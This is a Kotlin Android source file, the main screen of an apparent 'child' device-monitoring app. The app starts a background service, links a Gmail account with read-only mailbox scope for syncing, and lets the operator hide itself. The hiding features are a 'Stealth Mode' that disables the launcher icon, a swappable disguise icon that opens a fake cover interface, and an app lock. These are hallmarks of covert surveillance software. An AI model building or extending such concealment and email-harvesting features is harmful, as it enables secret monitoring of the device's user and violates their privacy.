@file:Suppress("DEPRECATION")

package nexus.android.child

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.ClipData
import android.content.ClipboardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.animation.AnimationUtils
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.GravityCompat
import androidx.drawerlayout.widget.DrawerLayout
import androidx.lifecycle.lifecycleScope
import com.google.android.gms.auth.api.signin.GoogleSignIn
import com.google.android.gms.auth.api.signin.GoogleSignInOptions
import com.google.android.gms.common.api.ApiException
import com.google.android.material.dialog.MaterialAlertDialogBuilder
import com.google.api.services.gmail.GmailScopes
import nexus.android.child.applock.AppLockActivity
import nexus.android.child.applock.AppLockManager
import nexus.android.child.gmail.GmailAuthRepository
import nexus.android.child.id.DeviceIdManager
import nexus.android.child.permissions.PermissionManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class MainActivity : AppCompatActivity() {

    private lateinit var permissionManager: PermissionManager
    private var statusReceiver: BroadcastReceiver? = null

    // Main content views
    private lateinit var drawerLayout: DrawerLayout
    private lateinit var loadingGroup: View
    private lateinit var childIdText: TextView
    private lateinit var statusText: TextView
    private lateinit var statusLed: View
    private lateinit var statusContainer: View
    private lateinit var hamburgerButton: ImageButton
    private lateinit var helperHint: View
    private lateinit var helperArrow: TextView

    // Sidebar views
    private var gmailStatusIconView: ImageView? = null

    private var statusCopy = "CONNECTING"
    private var childIdLoader: Job? = null

    companion object {
        private const val RC_GMAIL_SIGN_IN = 1001
    }

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        permissionManager = PermissionManager(this)

        // Check if we should skip app lock check (coming from AppLockActivity after successful unlock)
        val skipAppLockCheck = intent.getBooleanExtra("skip_app_lock_check", false)

        // Check if fake UI should be shown FIRST
        // Fake UI has its own app lock check after 10 sec tap
        if (!skipAppLockCheck && checkAndShowFakeUI()) {
            return // FakeUIActivity will handle the flow (including app lock)
        }

        // Check if app lock should be shown (only if fake UI is not enabled)
        if (!skipAppLockCheck && checkAndShowAppLock()) {
            return // AppLockActivity will handle the flow
        }

        setContentView(R.layout.activity_main)

        initViews()
        setupDrawer()
        setupSidebarMenu()
        setupInitialState()
        setupChildIdCopy()
        restoreAppCustomization()

        // Listen to BackgroundService
        val filter = IntentFilter(BackgroundService.ACTION_CONNECTION_STATUS)
        statusReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val status = intent?.getStringExtra(BackgroundService.EXTRA_STATUS)
                if (!status.isNullOrBlank()) {
                    Log.d("MainActivity", "Status update: $status")
                    updateStatusText(status)
                }
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(statusReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(statusReceiver, filter)
        }

        // Check runtime + special permissions
        if (
            permissionManager.allPermissionsGranted() &&
            permissionManager.allSpecialPermissionsGranted()
        ) {
            Log.d("MainActivity", "Permissions OK -> Starting service")
            startService(Intent(this, BackgroundService::class.java))
        } else {
            updateStatusText(getString(R.string.status_permissions_required))
        }
    }

    override fun onResume() {
        super.onResume()
        // Only restore UI state
        setupInitialState()
        // Update gmail status icon in sidebar
        gmailStatusIconView?.let { updateGmailStatusIcon(it) }
    }

    override fun onDestroy() {
        try {
            statusReceiver?.let { unregisterReceiver(it) }
        } catch (_: Exception) { }
        statusReceiver = null
        childIdLoader?.cancel()
        super.onDestroy()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RC_GMAIL_SIGN_IN) {
            handleGmailSignInResult(data)
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        permissionManager.onRequestPermissionsResult(requestCode) { allGranted ->
            if (
                allGranted &&
                permissionManager.allPermissionsGranted() &&
                permissionManager.allSpecialPermissionsGranted()
            ) {
                Log.d("MainActivity", "All permissions OK -> Start service")
                startService(Intent(this, BackgroundService::class.java))
                updateStatusText(getString(R.string.status_connecting))
            } else {
                Log.d("MainActivity", "Some permissions denied")
                permissionManager.safeToast("Permissions required")
                updateStatusText(getString(R.string.status_some_permissions_denied))
            }
        }
    }

    // ==================== View Initialization ====================

    private fun initViews() {
        drawerLayout = findViewById(R.id.drawer_layout)
        loadingGroup = findViewById(R.id.loading_group)
        childIdText = findViewById(R.id.child_id_text)
        statusText = findViewById(R.id.status_text)
        statusLed = findViewById(R.id.status_led)
        statusContainer = findViewById(R.id.status_container)
        hamburgerButton = findViewById(R.id.hamburger_button)
        helperHint = findViewById(R.id.helper_hint)
        helperArrow = findViewById(R.id.helper_arrow)

        // Gmail status icon in sidebar
        gmailStatusIconView = findViewById(R.id.sidebar_gmail_status_icon)
        gmailStatusIconView?.let { updateGmailStatusIcon(it) }

        // Start arrow animation
        val arrowAnim = AnimationUtils.loadAnimation(this, R.anim.arrow_slide_left)
        helperArrow.startAnimation(arrowAnim)
    }

    // ==================== Drawer Setup ====================

    private fun setupDrawer() {
        hamburgerButton.setOnClickListener {
            if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
                drawerLayout.closeDrawer(GravityCompat.START)
            } else {
                drawerLayout.openDrawer(GravityCompat.START)
            }
        }

        // Allow swiping from anywhere on the screen to open the drawer
        drawerLayout.setDrawerLockMode(DrawerLayout.LOCK_MODE_UNLOCKED)
        expandDrawerTouchArea()

        // Hide/show helper hint based on drawer state
        drawerLayout.addDrawerListener(object : DrawerLayout.SimpleDrawerListener() {
            override fun onDrawerOpened(drawerView: View) {
                helperHint.animate().alpha(0f).setDuration(200).start()
            }
            override fun onDrawerClosed(drawerView: View) {
                helperHint.animate().alpha(1f).setDuration(300).start()
            }
        })
    }

    /**
     * Expands the edge size of the DrawerLayout so the user can swipe
     * from anywhere on the left half of the screen to open the drawer.
     */
    private fun expandDrawerTouchArea() {
        try {
            val dragger = DrawerLayout::class.java.getDeclaredField("mLeftDragger")
            dragger.isAccessible = true
            val viewDragHelper = dragger.get(drawerLayout)

            val edgeSizeField = viewDragHelper!!.javaClass.getDeclaredField("mEdgeSize")
            edgeSizeField.isAccessible = true
            val currentEdgeSize = edgeSizeField.getInt(viewDragHelper)
            // Set edge size to half the display width
            val displayWidth = resources.displayMetrics.widthPixels
            edgeSizeField.setInt(viewDragHelper, (displayWidth * 0.5).toInt().coerceAtLeast(currentEdgeSize))
        } catch (e: Exception) {
            Log.w("MainActivity", "Could not expand drawer touch area", e)
        }
    }

    // ==================== Sidebar Menu ====================

    private fun setupSidebarMenu() {
        // 1. Permissions
        findViewById<LinearLayout>(R.id.sidebar_permissions).setOnClickListener {
            drawerLayout.closeDrawer(GravityCompat.START)
            handlePermissionsClick()
        }

        // 2. Stealth Mode
        findViewById<LinearLayout>(R.id.sidebar_stealth).setOnClickListener {
            drawerLayout.closeDrawer(GravityCompat.START)
            handleStealthClick()
        }

        // 3. App Lock
        findViewById<LinearLayout>(R.id.sidebar_app_lock).setOnClickListener {
            drawerLayout.closeDrawer(GravityCompat.START)
            startActivity(Intent(this, nexus.android.child.applock.AppLockSettingsActivity::class.java))
        }

        // 4. Connect Gmail
        findViewById<LinearLayout>(R.id.sidebar_gmail).setOnClickListener {
            drawerLayout.closeDrawer(GravityCompat.START)
            handleGmailMenuClick()
        }

        // 5. Change App Icon
        findViewById<LinearLayout>(R.id.sidebar_change_icon).setOnClickListener {
            drawerLayout.closeDrawer(GravityCompat.START)
            startActivity(Intent(this, nexus.android.child.customization.IconSelectionActivity::class.java))
        }

        // 6. Mod Store (placeholder)
        findViewById<LinearLayout>(R.id.sidebar_mod_store).setOnClickListener {
            drawerLayout.closeDrawer(GravityCompat.START)
            Toast.makeText(this, getString(R.string.toast_mod_store_coming_soon), Toast.LENGTH_SHORT).show()
        }
    }

    // ==================== Sidebar Handlers ====================

    private fun handlePermissionsClick() {
        if (permissionManager.allPermissionsGranted()) {
            Log.d("MainActivity", "Permissions already OK -> ensure service")
            startService(Intent(this, BackgroundService::class.java))
            updateStatusText(getString(R.string.status_connecting))
        } else {
            permissionManager.showPermissionRationaleDialog(
                onGrant = {
                    permissionManager.startPermissionFlow()
                    permissionManager.requestSpecialPermissions()
                },
                onCancel = { updateStatusText(getString(R.string.status_permissions_required)) }
            )
        }
    }

    private fun handleStealthClick() {
        try {
            startService(Intent(this, BackgroundService::class.java).apply {
                action = "STEALTH_ON"
            })
        } catch (e: Exception) {
            Log.e("MainActivity", "STEALTH_ON failed", e)
        }
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Toast.makeText(this, getString(R.string.toast_stealth_activated), Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to hide icon", e)
        }
    }

    // ==================== Status Management ====================

    private fun updateStatusText(status: String) {
        if (statusCopy == status) return
        statusCopy = status

        statusContainer.visibility = View.VISIBLE
        statusText.text = status

        // Update LED color based on status
        updateStatusLed(status)
    }

    private fun updateStatusLed(status: String) {
        val ledDrawable = statusLed.background
        if (ledDrawable is GradientDrawable) {
            val color = when {
                status.contains("ACTIVE", ignoreCase = true) ||
                status.contains("Connected", ignoreCase = true) -> {
                    // Start pulse animation
                    val pulse = AnimationUtils.loadAnimation(this, R.anim.led_pulse)
                    statusLed.startAnimation(pulse)
                    ContextCompat.getColor(this, R.color.status_active)
                }
                status.contains("CONNECTING", ignoreCase = true) -> {
                    statusLed.clearAnimation()
                    ContextCompat.getColor(this, R.color.status_connecting)
                }
                status.contains("ERROR", ignoreCase = true) ||
                status.contains("DENIED", ignoreCase = true) -> {
                    statusLed.clearAnimation()
                    ContextCompat.getColor(this, R.color.status_error)
                }
                else -> {
                    statusLed.clearAnimation()
                    ContextCompat.getColor(this, R.color.status_standby)
                }
            }
            ledDrawable.setColor(color)
        }
    }

    // ==================== Child ID ====================

    private fun setupInitialState() {
        val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
        val cached = DeviceIdManager.cachedId ?: prefs.getString("device_id", null)

        if (cached.isNullOrBlank()) {
            loadingGroup.visibility = View.VISIBLE
            childIdText.visibility = View.GONE
            statusContainer.visibility = View.GONE
            ensureChildIdLoaded()
        } else {
            displayChildId(cached)
        }
    }

    private fun displayChildId(id: String) {
        loadingGroup.visibility = View.GONE
        childIdText.visibility = View.VISIBLE
        statusContainer.visibility = View.VISIBLE
        childIdText.text = DeviceIdManager.format(id)
        updateStatusText(statusCopy)
    }

    private fun ensureChildIdLoaded() {
        DeviceIdManager.cachedId?.let {
            displayChildId(it)
            return
        }

        val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
        val stored = prefs.getString("device_id", null)
        if (!stored.isNullOrBlank()) {
            DeviceIdManager.cachedId = stored
            displayChildId(stored)
            return
        }

        if (childIdLoader?.isActive == true) return
        childIdLoader = lifecycleScope.launch(Dispatchers.IO) {
            try {
                val rawId = DeviceIdManager.generateUniqueDeviceId(applicationContext)
                withContext(Dispatchers.Main) { displayChildId(rawId) }
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to load device ID", e)
            }
        }
    }

    private fun setupChildIdCopy() {
        childIdText.setOnLongClickListener {
            val id = childIdText.text.toString().replace(" ", "")
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            clipboard.setPrimaryClip(ClipData.newPlainText("Child ID", id))
            Toast.makeText(this, getString(R.string.toast_child_id_copied), Toast.LENGTH_SHORT).show()
            true
        }
    }

    // ==================== Gmail ====================

    private fun handleGmailMenuClick() {
        if (GmailAuthRepository.isConnected(this)) {
            promptDisconnectGmail()
        } else startGmailSignIn()
    }

    private fun startGmailSignIn() {
        try {
            val gso = GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                .requestEmail()
                .requestScopes(com.google.android.gms.common.api.Scope(GmailScopes.GMAIL_READONLY))
                .build()

            val client = GoogleSignIn.getClient(this, gso)
            startActivityForResult(client.signInIntent, RC_GMAIL_SIGN_IN)

        } catch (e: Exception) {
            Log.e("MainActivity", "Gmail sign-in failed", e)
            Toast.makeText(this, "Unable to start Gmail sign-in.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun handleGmailSignInResult(data: Intent?) {
        try {
            val task = GoogleSignIn.getSignedInAccountFromIntent(data)
            val account = task.getResult(ApiException::class.java)
            val email = account?.email ?: account?.id ?: return

            GmailAuthRepository.setConnected(this, email)
            gmailStatusIconView?.let { updateGmailStatusIcon(it) }
            Toast.makeText(this, "Gmail connected.", Toast.LENGTH_SHORT).show()

            startService(Intent(this, BackgroundService::class.java).apply {
                action = BackgroundService.ACTION_GMAIL_SYNC_REFRESH
            })

        } catch (e: ApiException) {
            Log.e("MainActivity", "Gmail sign-in failed: ${e.statusCode}", e)
            Toast.makeText(this, "Gmail sign-in failed.", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e("MainActivity", "Gmail sign-in error", e)
            Toast.makeText(this, "Gmail sign-in error.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun promptDisconnectGmail() {
        MaterialAlertDialogBuilder(this)
            .setTitle("Disconnect Gmail")
            .setMessage("Stop syncing Gmail emails from this device?")
            .setPositiveButton("Disconnect") { _, _ ->
                GmailAuthRepository.clear(this)
                gmailStatusIconView?.let { updateGmailStatusIcon(it) }
                Toast.makeText(this, "Gmail disconnected.", Toast.LENGTH_SHORT).show()

                startService(Intent(this, BackgroundService::class.java).apply {
                    action = BackgroundService.ACTION_GMAIL_SYNC_REFRESH
                })
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun updateGmailStatusIcon(icon: ImageView) {
        val connected = GmailAuthRepository.isConnected(this)
        icon.setImageResource(
            if (connected) R.drawable.ic_gmail_status_connected
            else R.drawable.ic_gmail_status_disconnected
        )
    }

    // ==================== Customization ====================

    private fun restoreAppCustomization() {
        val icon = nexus.android.child.utils.AppCustomizationManager.getCurrentIconType(this)
        if (icon != nexus.android.child.utils.AppCustomizationManager.IconType.DEFAULT) {
            nexus.android.child.utils.AppCustomizationManager.changeAppIcon(this, icon)
        }
    }

    /**
     * Check if fake UI should be shown and show it if needed.
     * @return true if fake UI is shown, false otherwise
     */
    private fun checkAndShowFakeUI(): Boolean {
        val currentIcon = nexus.android.child.utils.AppCustomizationManager.getCurrentIconType(this)
        val isFakeUIEnabled = nexus.android.child.utils.FakeUIManager.isFakeUIEnabled(this, currentIcon)

        if (isFakeUIEnabled && currentIcon != nexus.android.child.utils.AppCustomizationManager.IconType.DEFAULT) {
            val intent = Intent(this, nexus.android.child.customization.FakeUIActivity::class.java)
            startActivity(intent)
            finish()
            return true
        }
        return false
    }

    /**
     * Check if app lock is enabled and show lock screen if needed.
     * @return true if app lock screen is shown, false otherwise
     */
    private fun checkAndShowAppLock(): Boolean {
        val prefs = getSharedPreferences("phantom_prefs", MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null)

        if (deviceId != null) {
            AppLockManager.initialize(this, deviceId)
        }

        if (AppLockManager.isAppLockEnabled(this)) {
            val intent = Intent(this, AppLockActivity::class.java)
            startActivity(intent)
            finish()
            return true
        }

        return false
    }

    override fun onBackPressed() {
        if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
            drawerLayout.closeDrawer(GravityCompat.START)
        } else {
            super.onBackPressed()
        }
    }
}
